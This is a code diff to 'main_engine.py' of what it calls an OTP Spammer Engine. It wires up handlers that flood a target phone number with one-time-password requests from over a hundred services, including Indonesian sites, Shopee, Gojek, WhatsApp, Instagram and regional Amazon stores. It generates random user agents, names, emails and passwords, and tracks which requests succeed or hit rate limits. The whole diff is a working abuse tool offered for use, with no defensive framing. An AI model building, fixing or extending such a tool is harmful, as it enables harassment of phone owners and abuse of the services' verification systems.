@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# main_engine.py - OTP Spammer Engine (FIXED)
+# main_engine.py - OTP Spammer Engine (FIXED ALL IMPORTS)
 
 import requests
 import uuid
@@ -19,22 +19,151 @@ from license import (
     RATE_LIMIT_KEYWORDS, get_active_apis, is_admin_number
 )
 from utils import normalize, fmt_08, fmt_nocode, fmt_plus, fmt_phone_only, get_public_ip, generate_multipart, extract_csrf, get_random_user_agent, get_headers_with_random_ua
+
+# ==================== IMPORT HANDLERS ====================
+# SEMUA NAMA FUNGSI DISAMAKAN DENGAN YANG ADA DI handlers.py
 from handlers import (
-    send_tuneup_otp, send_hashmicro_otp, send_internetrakyat_otp,
-    send_ultramilk_otp,  # <--- FIX: ganti send_ultramilk_register jadi send_ultramilk_otp
-    send_kaniva_otp, send_jembatani_otp,
-    send_rcx_otp, send_sahabatteknisi_otp, send_auto2000_otp,
-    send_astra_daihatsu_otp, send_royal_canin_otp, send_watsons_otp,
-    send_99co_otp, send_belirumah_otp, send_fastwork_otp,
-    send_hrsbre_otp, send_erafone_otp, send_beautyhaul_otp,
-    send_hainaya_otp, send_minumyukkaka_otp, send_sidemang_otp,
-    send_lapormasbup_otp, send_ptsp_kemenag_otp, send_planetban_otp
+    # ORIGINAL
+    send_hrsbre_otp,
+    send_erafone_otp,
+    send_planetban_otp,
+    send_tuneup_otp,
+    send_hashmicro_otp,
+    send_klook_otp,
+    send_internetrakyat_otp,
+    send_ultramilk_otp,
+    send_kaniva_otp,
+    send_jembatani_otp,
+    send_rcx_otp,
+    send_sahabat_otp,           # <--- FIX: send_sahabatteknisi_otp -> send_sahabat_otp
+    send_auto2000_otp,
+    send_astra_otp,             # <--- FIX: send_astra_daihatsu_otp -> send_astra_otp
+    send_royalcanin_otp,        # <--- FIX: send_royal_canin_otp -> send_royalcanin_otp
+    send_watsons_otp,
+    send_99co_otp,
+    send_belirumah_otp,
+    send_fastwork_otp,
+    send_beautyhaul_otp,
+    send_hainaya_otp,
+    send_minumyukkaka_otp,
+    send_sidemang_otp,
+    send_lapormasbup_otp,
+    send_ptspkemenag_otp,       # <--- FIX: send_ptsp_kemenag_otp -> send_ptspkemenag_otp
+    # GLOBAL
+    send_tokopedia_otp,
+    send_shopee_otp,
+    send_pinhome_otp,
+    send_maulagi_otp,
+    send_duniagames_otp,
+    send_acc_otp,
+    send_absenku_otp,
+    send_saturdays_otp,
+    send_singa_otp,
+    send_adiraku_otp,
+    send_payfaz_otp,
+    send_gojek_otp,
+    send_jenius_otp,
+    send_alodokter_otp,
+    send_blibli_otp,
+    send_halodoc_otp,
+    send_oyo_otp,
+    send_sayurbox_otp,
+    send_carsome_otp,
+    send_pizzahut_otp,
+    send_olx_otp,
+    send_indihome_otp,
+    send_dekoruma_otp,
+    send_rumah123_otp,
+    send_paper_otp,
+    send_depop_otp,
+    send_icq_otp,
+    send_cairin_otp,
+    send_mapclub_otp,
+    send_bukuwarung_otp,
+    send_rupiahcepat_otp,
+    send_tiktok_otp,
+    # EXTRA
+    send_bonusbelanja_otp,
+    send_hijup_otp,
+    send_bliblitiket_otp,
+    send_ohsome_otp,
+    send_optikmelawai_otp,
+    send_hollandbakery_otp,
+    send_hashmicro_otp,         # sudah ada
+    send_internetrakyat_otp,    # sudah ada
+    send_ultramilk_otp,         # sudah ada
+    send_kaniva_otp,            # sudah ada
+    send_jembatani_otp,         # sudah ada
+    send_rcx_otp,               # sudah ada
+    send_sahabat_otp,           # sudah ada
+    send_auto2000_otp,          # sudah ada
+    send_astra_otp,             # sudah ada
+    send_royalcanin_otp,        # sudah ada
+    send_watsons_otp,           # sudah ada
+    send_99co_otp,              # sudah ada
+    send_belirumah_otp,         # sudah ada
+    send_fastwork_otp,          # sudah ada
+    send_beautyhaul_otp,        # sudah ada
+    send_hainaya_otp,           # sudah ada
+    send_minumyukkaka_otp,      # sudah ada
+    send_sidemang_otp,          # sudah ada
+    send_lapormasbup_otp,       # sudah ada
+    send_ptspkemenag_otp,       # sudah ada
+    # GLOBAL EXTRA
+    send_zillow_otp,
+    send_uber_otp,
+    send_doordash_otp,
+    send_instagram_otp,
+    send_whatsapp_otp,
+    send_deliveroo_otp,
+    send_justeat_otp,
+    send_flipkart_otp,
+    send_paytm_otp,
+    send_zomato_otp,
+    send_ifood_otp,
+    send_mercadolivre_otp,
+    send_line_otp,
+    send_rakuten_otp,
+    send_naver_otp,
+    send_kakao_otp,
+    send_woolworths_otp,
+    send_coles_otp,
+    send_grab_sg_otp,
+    send_foodpanda_sg_otp,
+    send_grab_my_otp,
+    send_shopee_my_otp,
+    send_gcash_otp,
+    send_lazada_ph_otp,
+    send_zalando_otp,
+    send_amazon_de_otp,
+    send_cdiscount_otp,
+    send_amazon_fr_otp,
+    send_noon_otp,
+    send_amazon_ae_otp,
+    send_trendyol_otp,
+    send_hepsiburada_otp,
+    send_amazon_ca_otp,
+    send_uber_ca_otp,
+    send_amazon_eg_otp,
+    send_jumia_otp,
+    send_konga_otp,
+    send_amazon_es_otp,
+    send_amazon_it_otp,
+    send_amazon_mx_otp,
+    send_amazon_nl_otp,
+    send_allegro_otp,
+    send_amazon_se_otp,
+    send_mercadolibre_ar_otp,
+    send_mercadolibre_co_otp,
+    send_mercadolibre_cl_otp,
 )
+
 from targets import TARGETS
 
 print_lock = threading.Lock()
 stop_flag = False
 
+# ==================== LOGGING ====================
 def log_target(idx, total, name, status, detail=""):
     with print_lock:
         if status == "SUCCESS":
@@ -45,6 +174,7 @@ def log_target(idx, total, name, status, detail=""):
             sym, col = "-", Fore.RED
         print(f"{col}[{sym}]{Style.RESET_ALL} ({idx}/{total}) {name}: {status}" + (f" - {detail}" if detail else ""))
 
+# ==================== PROCESS TARGET ====================
 def process_target(api, target62, ip, idx, total):
     global stop_flag
     if stop_flag:
@@ -59,6 +189,7 @@ def process_target(api, target62, ip, idx, total):
         session = requests.Session()
         session.headers.update(get_headers_with_random_ua())
 
+        # === HANDLER KHUSUS ===
         if name == 'PlanetBan':
             number_08 = api['number_fmt'](target62)
             resp = send_planetban_otp(number_08)
@@ -139,7 +270,7 @@ def process_target(api, target62, ip, idx, total):
                 detail = "No response"
 
         elif api.get('post_type') == 'ultramilk':
-            resp = send_ultramilk_otp(target62)  # <--- FIX: pake send_ultramilk_otp
+            resp = send_ultramilk_otp(target62)
             if resp is not None:
                 text = resp.text.lower()
                 keywords = api.get('success_on', [])
@@ -158,8 +289,534 @@ def process_target(api, target62, ip, idx, total):
                 status_text = "ERROR"
                 detail = "No response"
 
-        # ... LANJUTKAN SEMUA HANDLER LAIN (SAMA KAYAK CODE ASLI) ...
+        elif api.get('post_type') == 'kaniva':
+            number_08 = api['number_fmt'](target62)
+            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
+            resp = send_kaniva_otp(number_08, rand_name)
+            if resp is not None:
+                text = resp.text.lower()
+                keywords = api.get('success_on', [])
+                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
+                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
+                if is_success:
+                    status_text = "SUCCESS"
+                    detail = "OTP sent"
+                    success = True
+                elif is_rate_limit:
+                    status_text = "LIMITED"
+                    detail = text[:60]
+                else:
+                    detail = f"({resp.status_code}) {text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "Token CSRF not found"
 
+        elif api.get('post_type') == 'jembatani':
+            number_08 = api['number_fmt'](target62)
+            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
+            jemb_pass = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
+            resp = send_jembatani_otp(number_08, rand_name, jemb_pass)
+            if resp is not None:
+                text = resp.text.lower()
+                keywords = api.get('success_on', [])
+                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
+                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
+                if is_success:
+                    status_text = "SUCCESS"
+                    detail = "OTP sent"
+                    success = True
+                elif is_rate_limit:
+                    status_text = "LIMITED"
+                    detail = text[:60]
+                else:
+                    detail = f"({resp.status_code}) {text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "Request failed"
+
+        elif api.get('post_type') == 'rcx':
+            number_08 = api['number_fmt'](target62)
+            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
+            rand_email = f'user{random.randint(1000,9999)}@mailnesia.com'
+            resp = send_rcx_otp(number_08, rand_name, rand_email)
+            if resp is not None:
+                text = resp.text.lower() if resp.text else ''
+                keywords = api.get('success_on', [])
+                is_success = (resp.status_code == 302 and any(kw in resp.headers.get('location','').lower() for kw in ['challenge'])) or any(kw in text for kw in keywords)
+                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
+                if is_success:
+                    status_text = "SUCCESS"
+                    detail = "OTP triggered"
+                    success = True
+                elif is_rate_limit:
+                    status_text = "LIMITED"
+                    detail = text[:60] if text else "limited"
+                else:
+                    detail = f"({resp.status_code}) {text[:60] if text else 'no body'}"
+            else:
+                status_text = "ERROR"
+                detail = "Request failed"
+
+        # === SAHABAT TEKNISI (FIXED) ===
+        elif api.get('post_type') == 'sahabatteknisi':
+            number_08 = api['number_fmt'](target62)
+            resp = send_sahabat_otp(number_08)  # <--- FIX: pake send_sahabat_otp
+            if resp is not None:
+                text = resp.text.lower()
+                keywords = api.get('success_on', [])
+                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
+                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
+                if is_success:
+                    status_text = "SUCCESS"
+                    detail = "OTP sent"
+                    success = True
+                elif is_rate_limit:
+                    status_text = "LIMITED"
+                    detail = text[:60]
+                else:
+                    detail = f"({resp.status_code}) {text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "Request failed"
+
+        elif api.get('post_type') == 'auto2000':
+            number_08 = api['number_fmt'](target62)
+            resp = send_auto2000_otp(number_08)
+            if resp is not None:
+                if resp.status_code == 200:
+                    try:
+                        data = resp.json()
+                        ack = data.get("acknowledge", 0)
+                        msg = data.get("message", "")
+                        if ack == 1 and msg == "success":
+                            status_text = "SUCCESS"
+                            detail = "OTP sent"
+                            success = True
+                        elif "resend in" in msg.lower():
+                            match = re.search(r'resend in (\d+) s', msg)
+                            sec = match.group(1) if match else "?"
+                            detail = f"Limit: retry after {sec}s"
+                            status_text = "LIMITED"
+                        else:
+                            detail = f"message: {msg[:60]}"
+                    except json.JSONDecodeError:
+                        detail = resp.text[:60]
+                elif resp.status_code == 403:
+                    status_text = "BLOCKED"
+                    detail = "Cloudflare 403"
+                else:
+                    detail = f"({resp.status_code}) {resp.text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "Failed after retries"
+
+        elif api.get('post_type') == 'astra_daihatsu':
+            number_62 = api['number_fmt'](target62)
+            resp = send_astra_otp(number_62)  # <--- FIX: pake send_astra_otp
+            if resp is not None and resp.status_code == 200:
+                try:
+                    data = resp.json()
+                    msg = data.get("message", "")
+                    ack = data.get("acknowledge", 0)
+                    if ack == 1 and "OTP Success" in msg:
+                        if "still valid" not in msg.lower():
+                            status_text = "SUCCESS"
+                            detail = "OTP sent"
+                            success = True
+                        else:
+                            status_text = "LIMITED"
+                            detail = "OTP still valid"
+                    else:
+                        detail = msg[:60]
+                except:
+                    detail = resp.text[:60]
+            elif resp is not None:
+                detail = f"({resp.status_code}) {resp.text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == 'royal_canin':
+            phone_plus = api['number_fmt'](target62)
+            resp = send_royalcanin_otp(phone_plus)  # <--- FIX: pake send_royalcanin_otp
+            if resp is not None and resp.status_code == 200:
+                try:
+                    data = resp.json()
+                    result = data.get("result", {})
+                    if result.get("ReturnStatus") == 1:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    else:
+                        detail = result.get("ReturnMessage", "")[:60]
+                except:
+                    detail = resp.text[:60]
+            elif resp is not None:
+                detail = f"({resp.status_code}) {resp.text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == 'watsons':
+            phone_no_code = api['number_fmt'](target62)
+            resp = send_watsons_otp(phone_no_code)
+            if resp is not None and resp.status_code == 200:
+                try:
+                    data = resp.json()
+                    if "token" in data:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    else:
+                        detail = f"Response: {str(data)[:60]}"
+                except:
+                    detail = resp.text[:60]
+            elif resp is not None:
+                detail = f"({resp.status_code}) {resp.text[:60]}"
+                if resp.status_code == 429:
+                    status_text = "LIMITED"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == '99co':
+            phone_plus = api['number_fmt'](target62)
+            resp = send_99co_otp(phone_plus)
+            if resp is not None:
+                text = resp.text.lower()
+                keywords = api.get('success_on', [])
+                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
+                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
+                if is_success:
+                    status_text = "SUCCESS"
+                    detail = "OTP sent"
+                    success = True
+                elif is_rate_limit:
+                    status_text = "LIMITED"
+                    detail = text[:60]
+                else:
+                    detail = f"({resp.status_code}) {text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == 'belirumahco':
+            phone_plus = api['number_fmt'](target62)
+            resp = send_belirumah_otp(phone_plus)
+            if resp is not None:
+                text = resp.text.lower()
+                keywords = api.get('success_on', [])
+                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
+                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
+                if is_success:
+                    status_text = "SUCCESS"
+                    detail = "OTP sent"
+                    success = True
+                elif is_rate_limit:
+                    status_text = "LIMITED"
+                    detail = text[:60]
+                else:
+                    detail = f"({resp.status_code}) {text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == 'fastworkid':
+            number_08 = api['number_fmt'](target62)
+            resp = send_fastwork_otp(number_08)
+            if resp is not None:
+                text = resp.text.lower()
+                keywords = api.get('success_on', [])
+                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
+                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
+                if is_success:
+                    status_text = "SUCCESS"
+                    detail = "OTP sent"
+                    success = True
+                elif is_rate_limit:
+                    status_text = "LIMITED"
+                    detail = text[:60]
+                else:
+                    detail = f"({resp.status_code}) {text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == 'hrsbre':
+            number_08 = api['number_fmt'](target62)
+            status_code, resp_text = send_hrsbre_otp(number_08)
+            if status_code:
+                text = resp_text.lower() if resp_text else ''
+                keywords = api.get('success_on', [])
+                is_success = any(kw in text for kw in keywords)
+                is_rate_limit = (status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
+                if is_success:
+                    status_text = "SUCCESS"
+                    detail = "OTP sent"
+                    success = True
+                elif is_rate_limit:
+                    status_text = "LIMITED"
+                    detail = text[:60]
+                else:
+                    detail = f"({status_code}) {text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "Network error"
+
+        elif api.get('post_type') == 'erafone':
+            number_normal = api['number_fmt'](target62)
+            result = send_erafone_otp(number_normal)
+            if isinstance(result, tuple) and len(result) == 2:
+                code, resp = result
+                if code == 200:
+                    if isinstance(resp, dict) and resp.get("message") == "Success Request OTP":
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    else:
+                        detail = f"({code}) {resp if isinstance(resp, str) else ''}".strip()[:60]
+                else:
+                    detail = f"({code}) {str(resp)[:60]}"
+                    if code == 429:
+                        status_text = "LIMITED"
+            else:
+                status_text = "ERROR"
+                detail = "Bad response format"
+
+        elif api.get('post_type') == 'beautyhaul':
+            local_number = api['number_fmt'](target62)
+            resp = send_beautyhaul_otp(local_number)
+            if resp is not None:
+                text = resp.text.lower()
+                keywords = api.get('success_on', [])
+                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
+                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
+                if is_success:
+                    status_text = "SUCCESS"
+                    detail = "OTP sent"
+                    success = True
+                elif is_rate_limit:
+                    status_text = "LIMITED"
+                    detail = text[:60]
+                else:
+                    detail = f"({resp.status_code}) {text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == 'hainaya':
+            phone_for_api = api['number_fmt'](target62)
+            resp = send_hainaya_otp(phone_for_api)
+            if resp is not None:
+                status_code = resp.status_code
+                try:
+                    data = resp.json()
+                    text = resp.text.lower()
+                except:
+                    data = {}
+                    text = resp.text.lower()
+                if status_code == 201:
+                    if data.get('tenant_id'):
+                        status_text = "SUCCESS"
+                        detail = "OTP sent (register)"
+                        success = True
+                    else:
+                        detail = "201 no tenant_id"
+                elif status_code == 200:
+                    if data.get('session_id') or data.get('message'):
+                        status_text = "SUCCESS"
+                        detail = "OTP sent (login)"
+                        success = True
+                    else:
+                        detail = f"200: {str(data)[:60]}"
+                elif status_code == 409:
+                    status_text = "SUCCESS"
+                    detail = "OTP sent (already registered)"
+                    success = True
+                elif status_code == 429:
+                    status_text = "LIMITED"
+                    detail = "Rate limit"
+                else:
+                    keywords = api.get('success_on', [])
+                    is_success = any(kw in text for kw in keywords)
+                    if is_success:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    else:
+                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == 'minumyukkaka':
+            phone_08 = api['number_fmt'](target62)
+            resp = send_minumyukkaka_otp(phone_08)
+            if resp is not None:
+                status_code = resp.status_code
+                try:
+                    data = resp.json()
+                    text = resp.text.lower()
+                except:
+                    data = {}
+                    text = resp.text.lower()
+                if status_code == 200:
+                    if data.get('IsSuccess') == True:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    else:
+                        error_msg = data.get('Message', 'Unknown error')
+                        if 'rate' in error_msg.lower() or 'limit' in error_msg.lower():
+                            status_text = "LIMITED"
+                            detail = error_msg[:60]
+                        else:
+                            detail = f"Error: {error_msg[:60]}"
+                elif status_code == 429:
+                    status_text = "LIMITED"
+                    detail = "Rate limit"
+                else:
+                    keywords = api.get('success_on', [])
+                    is_success = any(kw in text for kw in keywords)
+                    if is_success:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    else:
+                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == 'sidemang':
+            phone_08 = api['number_fmt'](target62)
+            resp = send_sidemang_otp(phone_08)
+            if resp is not None:
+                status_code = resp.status_code
+                try:
+                    data = resp.json()
+                    text = resp.text.lower()
+                except:
+                    data = {}
+                    text = resp.text.lower()
+                if status_code == 200:
+                    if data.get('otpDispatched') == True:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    else:
+                        error_msg = data.get('message', 'Unknown error')
+                        detail = f"Error: {error_msg[:60]}"
+                elif status_code == 429:
+                    status_text = "LIMITED"
+                    detail = "Rate limit"
+                elif status_code == 400:
+                    error_msg = data.get('message', 'Bad Request')
+                    detail = f"Error: {error_msg[:60]}"
+                else:
+                    keywords = api.get('success_on', [])
+                    is_success = any(kw in text for kw in keywords)
+                    if is_success:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    else:
+                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == 'lapormasbup':
+            phone_08 = api['number_fmt'](target62)
+            resp, is_resend = send_lapormasbup_otp(phone_08)
+            if resp is not None:
+                status_code = resp.status_code
+                try:
+                    data = resp.json()
+                    text = resp.text.lower()
+                except:
+                    data = {}
+                    text = resp.text.lower()
+                if status_code == 200:
+                    if 'user' in data and 'warga_id' in data['user']:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
+                        success = True
+                    elif data.get('message') and 'berhasil' in data.get('message', '').lower():
+                        status_text = "SUCCESS"
+                        detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
+                        success = True
+                    else:
+                        detail = f"Response: {str(data)[:60]}"
+                elif status_code == 400:
+                    error_msg = data.get('error', data.get('message', 'Bad Request'))
+                    if 'verifikasi' in error_msg.lower():
+                        status_text = "SUCCESS"
+                        detail = "OTP sent (auto-resend)"
+                        success = True
+                    else:
+                        detail = f"Error: {error_msg[:60]}"
+                elif status_code == 429:
+                    status_text = "LIMITED"
+                    detail = "Rate limit"
+                else:
+                    keywords = api.get('success_on', [])
+                    is_success = any(kw in text for kw in keywords)
+                    if is_success:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
+                        success = True
+                    else:
+                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        elif api.get('post_type') == 'ptspkemenag':
+            phone_08 = api['number_fmt'](target62)
+            resp = send_ptspkemenag_otp(phone_08)  # <--- FIX: pake send_ptspkemenag_otp
+            if resp is not None:
+                status_code = resp.status_code
+                try:
+                    data = resp.json()
+                    text = resp.text.lower()
+                except:
+                    data = {}
+                    text = resp.text.lower()
+                if status_code == 200 or status_code == 201:
+                    if data.get('success') == True:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    elif 'user' in data or 'data' in data:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    else:
+                        detail = f"Response: {str(data)[:60]}"
+                elif status_code == 400:
+                    error_msg = data.get('message', 'Bad Request')
+                    detail = f"Error: {error_msg[:60]}"
+                elif status_code == 409:
+                    status_text = "LIMITED"
+                    detail = "Already registered"
+                elif status_code == 429:
+                    status_text = "LIMITED"
+                    detail = "Rate limit"
+                else:
+                    keywords = api.get('success_on', [])
+                    is_success = any(kw in text for kw in keywords)
+                    if is_success:
+                        status_text = "SUCCESS"
+                        detail = "OTP sent"
+                        success = True
+                    else:
+                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
+            else:
+                status_text = "ERROR"
+                detail = "No response"
+
+        # ==================== DEFAULT ====================
         else:
             referer = api.get('referer', '').replace('{raw}', target62)
             if referer:
@@ -282,6 +939,7 @@ def process_target(api, target62, ip, idx, total):
     log_target(idx, total, name, status_text, detail)
     return success
 
+# ==================== FUNGSI UTAMA ====================
 def run_single_round(threads=1):
     global stop_flag
     stop_flag = False
